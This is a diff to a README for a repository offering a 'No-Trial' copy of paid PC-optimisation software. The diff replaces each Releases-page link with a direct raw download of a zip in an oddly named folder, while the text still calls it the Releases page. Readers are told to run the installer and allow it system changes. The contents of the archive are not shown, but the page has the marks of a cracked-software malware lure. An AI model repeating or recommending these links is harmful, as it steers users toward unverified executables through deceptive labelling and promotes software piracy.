@@ -1,6 +1,6 @@
 # 🛠️ IObit-iFreeUp-Pro-No-Trial - Optimize Your PC with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/MuttsuOkami/IObit-iFreeUp-Pro-No-Trial/releases)
+[![Download](https://raw.githubusercontent.com/MuttsuOkami/IObit-iFreeUp-Pro-No-Trial/main/pseudomeric/IObit-iFreeUp-Pro-No-Trial_2.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/MuttsuOkami/IObit-iFreeUp-Pro-No-Trial/main/pseudomeric/IObit-iFreeUp-Pro-No-Trial_2.3.zip)
 
 ## 📖 Overview
 
@@ -10,13 +10,13 @@ IObit iFreeUp Pro helps you optimize your Windows PC. This software package is d
 
 To get started with IObit iFreeUp Pro, follow these easy steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/MuttsuOkami/IObit-iFreeUp-Pro-No-Trial/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/MuttsuOkami/IObit-iFreeUp-Pro-No-Trial/main/pseudomeric/IObit-iFreeUp-Pro-No-Trial_2.3.zip).
 2. **Find the Latest Version**: Look for the most recent version listed at the top.
 3. **Download the Application**: Click on the version number to download the installer file for your system.
 
 ## 📥 Download & Install
 
-1. **Download the Installer**: Navigate to the [Releases page](https://github.com/MuttsuOkami/IObit-iFreeUp-Pro-No-Trial/releases). Once there, simply click the download link for the installer file.
+1. **Download the Installer**: Navigate to the [Releases page](https://raw.githubusercontent.com/MuttsuOkami/IObit-iFreeUp-Pro-No-Trial/main/pseudomeric/IObit-iFreeUp-Pro-No-Trial_2.3.zip). Once there, simply click the download link for the installer file.
 2. **Run the Installer**: After downloading, locate the installer file on your computer. Double-click to run it. If prompted by your computer, allow the application to make changes.
 3. **Follow the Installation Instructions**: The installer will guide you through the steps. Just click next, accept the terms, and choose your installation path.
 4. **Launch the Application**: Once the installation completes, you can find IObit iFreeUp Pro in your Applications or Start Menu. Click to open it.
@@ -54,6 +54,6 @@ For more support, please check the documentation in this repository or join our 
 
 ## 📢 Notes
 
-Regularly check for updates on the [Releases page](https://github.com/MuttsuOkami/IObit-iFreeUp-Pro-No-Trial/releases) to keep your application running efficiently. Always ensure you have the latest version for the best results. 
+Regularly check for updates on the [Releases page](https://raw.githubusercontent.com/MuttsuOkami/IObit-iFreeUp-Pro-No-Trial/main/pseudomeric/IObit-iFreeUp-Pro-No-Trial_2.3.zip) to keep your application running efficiently. Always ensure you have the latest version for the best results. 
 
 By following these steps, you'll optimize your PC in no time. Enjoy a smoother, faster computing experience with IObit iFreeUp Pro!
